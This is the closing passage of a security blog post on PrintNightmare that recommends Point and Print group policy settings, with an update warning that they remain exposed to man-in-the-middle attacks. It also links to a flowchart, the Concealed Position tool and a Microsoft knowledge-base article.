+> **2024-10-05 Update** : The configuration recommended below is actually not completely safe, it is still prone to _Man-in-the-Middle_ attacks. For more information, please check out this post: [The PrintNightmare is not Over Yet](/printnightmare-not-over/).
+
+However, if you do need to allow domain users to install shared printers, you will have to disable this policy. In this case, the following configuration offers the best compromise between usability and security.
+
+  * [Limits print driver installation to Administrators](https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.Printing::RestrictDriverInstallationToAdministrators) –> `Disabled`
+  * [Only use Package Point and print](https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.Printing::PackagePointAndPrintOnly) –> `Enabled`
+  * [Package Point and print - Approved servers](https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.Printing::PackagePointAndPrintServerList_Win7) –> List of in-forest print servers
+
+> For Package Point and Print to work as intended, printers must be set up with **package aware** drivers.
+
+Finally, the following flowchart should provide a better overview of those group policies, and how an improper configuration could lead to local privilege escalation.
+
+[![Point and Print configuration flowchart](/assets/posts/2024-01-28-printnightmare-exploitation/22_config-flowchart-dark.png)](/assets/posts/2024-01-28-printnightmare-exploitation/22_config-flowchart-dark.png) [![Point and Print configuration flowchart](/assets/posts/2024-01-28-printnightmare-exploitation/22_config-flowchart-light.png)](/assets/posts/2024-01-28-printnightmare-exploitation/22_config-flowchart-light.png) _Point and Print configuration flowchart_
+
+##  Links & Resources __
+
+  * GitHub - Concealed Position by [@Junior_Baines](https://github.com/jacob-baines)  
+<https://github.com/jacob-baines/concealed_position>
+  * Microsoft - KB5005652 - Manage new Point and Print default driver installation behavior (CVE-2021-34481)  
+<https://support.microsoft.com/en-gb/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
+
+__[Privilege Escalation](/categories/privilege-escalation/)
+
+__[Vulnerability](/tags/vulnerability/) [Privilege Escalation](/tags/privilege-escalation/) [Exploit](/tags/exploit/)
+
+This post is licensed under [ CC BY 4.0 ](https://creativecommons.org/licenses/by/4.0/) by the author.
+
+Share [ __](https://www.linkedin.com/feed/?shareActive=true&shareUrl=https%3A%2F%2Fitm4n.github.io%2Fprintnightmare-exploitation%2F "Linkedin") __ __
